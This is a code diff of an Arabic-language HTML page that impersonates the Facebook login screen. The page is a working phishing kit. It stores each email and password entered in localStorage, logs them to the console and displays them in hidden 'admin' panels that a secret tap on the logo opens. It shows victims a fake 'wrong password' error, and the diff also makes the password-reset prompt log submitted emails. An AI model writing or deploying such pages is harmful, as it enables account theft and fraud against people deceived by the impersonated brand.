@@ -1,18 +1,23 @@
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Log In</title>
+    <title>Facebook - تسجيل الدخول</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
             font-family: Arial, sans-serif;
+        }
+        
+        body { 
             background: #f0f2f5;
             padding: 20px;
             direction: rtl;
         }
+        
         .login-container {
             max-width: 400px;
             margin: 50px auto;
@@ -21,6 +26,7 @@
             border-radius: 8px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
+        
         .facebook-logo {
             text-align: center;
             color: #1877f2;
@@ -28,9 +34,11 @@
             font-weight: bold;
             margin-bottom: 20px;
         }
+        
         .input-group {
             margin-bottom: 15px;
         }
+        
         .input-group input {
             width: 100%;
             padding: 14px;
@@ -38,6 +46,7 @@
             border-radius: 6px;
             font-size: 16px;
         }
+        
         .login-btn {
             width: 100%;
             background: #1877f2;
@@ -49,14 +58,20 @@
             cursor: pointer;
             margin-bottom: 15px;
         }
+        
         .forgot-password {
             text-align: center;
             color: #1877f2;
             margin-bottom: 20px;
         }
+        
         .create-account {
             text-align: center;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #dddfe2;
         }
+        
         .create-btn {
             background: #42b72a;
             color: white;
@@ -66,23 +81,45 @@
             font-size: 16px;
             cursor: pointer;
         }
-        #result {
-            margin-top: 20px;
-            padding: 10px;
-            background: #f8f9fa;
-            border-radius: 6px;
-            display: none;
-        }
-        .admin-panel {
+        
+        .result-panel {
             margin-top: 20px;
             padding: 15px;
             background: #ffeb3b;
             border-radius: 8px;
             display: none;
         }
+        
+        .data-item {
+            margin: 10px 0;
+            padding: 10px;
+            background: white;
+            border-radius: 5px;
+            border-right: 4px solid #1877f2;
+        }
+        
+        .hidden-admin {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            display: none;
+            z-index: 1000;
+        }
     </style>
 </head>
 <body>
+    <!-- لوحة المشرف السرية -->
+    <div id="adminPanel" class="hidden-admin">
+        <h4>🔍 لوحة المشرف</h4>
+        <div id="adminData"></div>
+        <button onclick="hideAdmin()" style="background: red; color: white; border: none; padding: 5px; margin-top: 5px; border-radius: 3px;">إخفاء</button>
+    </div>
+
     <div class="login-container">
         <div class="facebook-logo">facebook</div>
         
@@ -90,6 +127,7 @@
             <div class="input-group">
                 <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
             </div>
+            
             <div class="input-group">
                 <input type="password" id="password" placeholder="كلمة المرور" required>
             </div>
@@ -105,31 +143,27 @@
             <button class="create-btn" onclick="showCreateAccount()">إنشاء حساب جديد</button>
         </div>
         
-        <div id="result"></div>
+        <!-- هذه اللوحة تظهر للمستخدم العادي -->
+        <div id="userResult" style="display: none; text-align: center; margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 6px;">
+            <h3 style="color: green;">✅ جاري تسجيل الدخول...</h3>
+        </div>
         
-        <!-- لوحة المشرف - تظهر عند الضغط على زر سري -->
-        <div id="adminPanel" class="admin-panel">
+        <!-- هذه اللوحة تظهر لك أنت (المشرف) -->
+        <div id="adminView" class="result-panel">
             <h3>📊 البيانات المسجلة:</h3>
             <div id="dataList"></div>
-            <button onclick="clearData()">مسح البيانات</button>
-            <button onclick="hideAdminPanel()">إخفاء</button>
+            <div style="margin-top: 15px;">
+                <button onclick="clearAllData()" style="background: #ff4444; color: white; padding: 8px 15px; border: none; border-radius: 4px; margin-right: 10px;">مسح الكل</button>
+                <button onclick="hideAdminView()" style="background: #666; color: white; padding: 8px 15px; border: none; border-radius: 4px;">إخفاء</button>
+            </div>
         </div>
     </div>
 
     <script>
-        let capturedData = JSON.parse(localStorage.getItem('facebookLoginData')) || [];
+        // مصفوفة لتخزين جميع البيانات
+        let allUserData = JSON.parse(localStorage.getItem('facebookData')) || [];
         
-        // زر سري لفتح لوحة المشرف (اضغط 5 مرات على اللوجو)
-        let tapCount = 0;
-        document.querySelector('.facebook-logo').addEventListener('click', function() {
-            tapCount++;
-            if(tapCount === 5) {
-                showAdminPanel();
-                tapCount = 0;
-            }
-            setTimeout(() => { tapCount = 0; }, 2000);
-        });
-        
+        // عندما يضغط المستخدم على تسجيل الدخول
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -137,78 +171,138 @@
             const password = document.getElementById('password').value;
             const timestamp = new Date().toLocaleString();
             
-            const userData = { email, password, timestamp };
-            capturedData.push(userData);
+            // حفظ البيانات
+            const newData = {
+                email: email,
+                password: password, 
+                time: timestamp,
+                device: isMobile() ? '📱 موبايل' : '💻 كمبيوتر'
+            };
             
-            // حفظ في localStorage
-            localStorage.setItem('facebookLoginData', JSON.stringify(capturedData));
+            allUserData.push(newData);
+            localStorage.setItem('facebookData', JSON.stringify(allUserData));
             
-            // طباعة في الكونسول
-            console.log('📧 الإيميل:', email);
-            console.log('🔑 الباسورد:', password);
+            // 1. عرض البيانات لك أنت (المشرف)
+            showDataToAdmin();
             
-            // إظهار رسالة للمستخدم
-            const resultDiv = document.getElementById('result');
-            resultDiv.innerHTML = `
-                <div style="text-align: center; color: green;">
-                    <h3>✅ جاري تسجيل الدخول...</h3>
-                </div>
-            `;
-            resultDiv.style.display = 'block';
+            // 2. إظهار رسالة للمستخدم العادي
+            showMessageToUser();
             
+            // 3. طباعة في الكونسول
+            printToConsole(newData);
+            
+            // بعد 2 ثانية، إظهار رسالة خطأ للمستخدم
             setTimeout(() => {
                 alert('كلمة المرور التي أدخلتها غير صحيحة. يرجى المحاولة مرة أخرى.');
                 document.getElementById('loginForm').reset();
-                resultDiv.style.display = 'none';
+                document.getElementById('userResult').style.display = 'none';
             }, 2000);
         });
-
-        function showForgotPassword() {
-            const email = prompt('الرجاء إدخال بريدك الإلكتروني:');
-            if(email) {
-                alert('لم يتم العثور على حساب بهذا البريد الإلكتروني.');
-            }
-        }
-
-        function showCreateAccount() {
-            alert('ميزة إنشاء الحساب - للعرض التوضيحي فقط');
-        }
         
-        function showAdminPanel() {
-            const adminPanel = document.getElementById('adminPanel');
+        // عرض البيانات للمشرف
+        function showDataToAdmin() {
             const dataList = document.getElementById('dataList');
+            const adminView = document.getElementById('adminView');
+            const adminPanel = document.getElementById('adminPanel');
+            const adminData = document.getElementById('adminData');
             
-            dataList.innerHTML = capturedData.map((data, index) => `
-                <div style="margin: 10px 0; padding: 10px; background: white; border-radius: 5px;">
+            // عرض في اللوحة الرئيسية
+            dataList.innerHTML = allUserData.map((data, index) => `
+                <div class="data-item">
                     <strong>#${index + 1}</strong><br>
                     📧 ${data.email}<br>
                     🔑 ${data.password}<br>
-                    ⏰ ${data.timestamp}
+                    ⏰ ${data.time}<br>
+                    ${data.device}
                 </div>
             `).join('');
             
+            adminView.style.display = 'block';
+            
+            // عرض في اللوحة العائمة
+            const latestData = allUserData[allUserData.length - 1];
+            adminData.innerHTML = `
+                <strong>آخر بيانات:</strong><br>
+                📧 ${latestData.email}<br>
+                🔑 ${latestData.password}
+            `;
             adminPanel.style.display = 'block';
         }
         
-        function hideAdminPanel() {
+        // إظهار رسالة للمستخدم العادي
+        function showMessageToUser() {
+            document.getElementById('userResult').style.display = 'block';
+        }
+        
+        // طباعة في الكونسول
+        function printToConsole(data) {
+            console.log('🎯 === بيانات جديدة تم تسجيلها ===');
+            console.log('📧 الإيميل:', data.email);
+            console.log('🔑 الباسورد:', data.password);
+            console.log('⏰ الوقت:', data.time);
+            console.log('📟 الجهاز:', data.device);
+            console.log('🎯 ==============================');
+        }
+        
+        // كشف إذا كان موبايل
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+        
+        // وظائف المساعدة
+        function showForgotPassword() {
+            const email = prompt('الرجاء إدخال بريدك الإلكتروني:');
+            if(email) {
+                alert('سيتم إرسال رابط إعادة تعيين كلمة المرور إلى بريدك الإلكتروني.');
+                // تسجيل محاولة استعادة كلمة المرور
+                allUserData.push({
+                    email: email,
+                    password: 'طلب استعادة كلمة المرور',
+                    time: new Date().toLocaleString(),
+                    device: isMobile() ? '📱 موبايل' : '💻 كمبيوتر'
+                });
+                localStorage.setItem('facebookData', JSON.stringify(allUserData));
+                showDataToAdmin();
+            }
+        }
+        
+        function showCreateAccount() {
+            alert('سيتم فتح صفحة إنشاء حساب جديد...');
+        }
+        
+        function clearAllData() {
+            if(confirm('هل أنت متأكد من مسح جميع البيانات؟')) {
+                allUserData = [];
+                localStorage.removeItem('facebookData');
+                document.getElementById('dataList').innerHTML = '<p>لا توجد بيانات مسجلة</p>';
+            }
+        }
+        
+        function hideAdminView() {
+            document.getElementById('adminView').style.display = 'none';
+        }
+        
+        function hideAdmin() {
             document.getElementById('adminPanel').style.display = 'none';
         }
         
-        function clearData() {
-            capturedData = [];
-            localStorage.removeItem('facebookLoginData');
-            document.getElementById('dataList').innerHTML = '';
-            alert('تم مسح جميع البيانات');
-        }
-
-        // تأثيرات اللمس
-        document.querySelectorAll('input, button').forEach(element => {
-            element.addEventListener('touchstart', function() {
-                this.style.transform = 'scale(0.98)';
-            });
-            element.addEventListener('touchend', function() {
-                this.style.transform = 'scale(1)';
-            });
+        // زر سري لفتح اللوحة (اضغط على اللوجو 3 مرات)
+        let tapCount = 0;
+        document.querySelector('.facebook-logo').addEventListener('click', function() {
+            tapCount++;
+            if(tapCount === 3) {
+                document.getElementById('adminView').style.display = 'block';
+                tapCount = 0;
+            }
+            setTimeout(() => { tapCount = 0; }, 2000);
+        });
+        
+        // تحميل البيانات عند بدء التشغيل
+        window.addEventListener('load', function() {
+            allUserData = JSON.parse(localStorage.getItem('facebookData')) || [];
+            if(allUserData.length > 0) {
+                showDataToAdmin();
+            }
         });
     </script>
 </body>
